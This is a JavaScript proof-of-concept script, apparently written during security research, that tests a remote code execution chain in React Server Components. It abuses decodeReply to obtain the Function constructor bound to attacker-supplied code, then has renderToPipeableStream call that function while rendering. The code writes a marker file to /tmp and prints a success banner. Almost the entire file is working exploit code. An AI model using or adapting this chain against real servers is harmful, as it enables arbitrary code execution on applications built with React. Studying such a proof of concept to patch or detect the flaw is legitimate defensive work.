/**
 * Test: Can we achieve RCE by having React RENDER the malicious value?
 *
 * If decodeReply returns Function.bind(null, "code"), and that value
 * gets rendered as a React element, will renderFunctionComponent call it?
 */

'use strict';

const { Writable } = require('stream');

// Setup
let webpackModuleIdx = 0;
const webpackServerModules = {};
const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => webpackServerModules[id];

const funcIdx = '' + webpackModuleIdx++;
webpackServerModules[funcIdx] = function action() { return 'legit'; };
const funcPath = 'file:///' + funcIdx;
webpackServerMap[funcPath + '#constructor'] = { id: funcIdx, chunks: [], name: 'constructor' };

process.env.NODE_ENV = 'production';

// Need full React for rendering
const React = {
  __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
  version: '19.0.0',
  createElement: function(type, props, ...children) {
    return {
      $$typeof: Symbol.for('react.element'),
      type,
      props: { ...props, children },
      key: null,
      ref: null,
    };
  }
};

require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: React
};

const { decodeReply, renderToPipeableStream } = require('react-server-dom-webpack/server.node');

console.log('='.repeat(60));
console.log('Test: RCE via React Rendering');
console.log('='.repeat(60));
console.log('');

async function test() {
  // First, get our malicious function via decodeReply
  const rceCode = `
    const fs = process.mainModule.require('fs');
    fs.writeFileSync('/tmp/render-rce.txt', 'RENDER RCE: ' + new Date().toISOString());
    return { rendered: true };
  `;

  // Clean up
  try { require('fs').unlinkSync('/tmp/render-rce.txt'); } catch(e) {}

  const formData = new Map();
  formData.set('1', JSON.stringify({
    id: funcPath + '#constructor',
    bound: '$@2'
  }));
  formData.set('2', JSON.stringify([rceCode]));
  formData.set('0', '"$F1"');
  formData.forEach = function(cb) {
    for (const [k, v] of this.entries()) cb(v, k);
  };

  console.log('[1] Getting malicious function via decodeReply...');
  const boundFn = await decodeReply(formData, webpackServerMap);
  console.log('    Type:', typeof boundFn);
  console.log('    Name:', boundFn.name);

  console.log('');
  console.log('[2] Creating React element with malicious function as type...');

  // Create a React element where the "type" is our bound function
  // When React renders this, it will call renderFunctionComponent
  // which does: Component(props)
  const element = React.createElement(boundFn, {});
  console.log('    Element created');
  console.log('    Element type:', typeof element.type);

  console.log('');
  console.log('[3] Attempting to render the element...');
  console.log('    File exists before render?', require('fs').existsSync('/tmp/render-rce.txt'));

  try {
    // Use renderToPipeableStream to render
    const stream = renderToPipeableStream(element, webpackServerMap);

    // Collect output
    let output = '';
    const writable = new Writable({
      write(chunk, encoding, callback) {
        output += chunk.toString();
        callback();
      }
    });

    await new Promise((resolve, reject) => {
      stream.pipe(writable);
      writable.on('finish', resolve);
      writable.on('error', reject);
      // Timeout after 2 seconds
      setTimeout(() => resolve(), 2000);
    });

    console.log('');
    console.log('[4] Render complete');
    console.log('    Output length:', output.length);
    console.log('    Output preview:', output.slice(0, 200));
    console.log('');
    console.log('    File exists after render?', require('fs').existsSync('/tmp/render-rce.txt'));

    if (require('fs').existsSync('/tmp/render-rce.txt')) {
      console.log('    File contents:', require('fs').readFileSync('/tmp/render-rce.txt', 'utf8'));
      console.log('');
      console.log('========================================');
      console.log('âœ“ RCE VIA REACT RENDERING!');
      console.log('========================================');
    }
  } catch (e) {
    console.log('    Render error:', e.message);
    console.log('');
    console.log('    File exists after error?', require('fs').existsSync('/tmp/render-rce.txt'));
  }
}

test().catch(console.error);
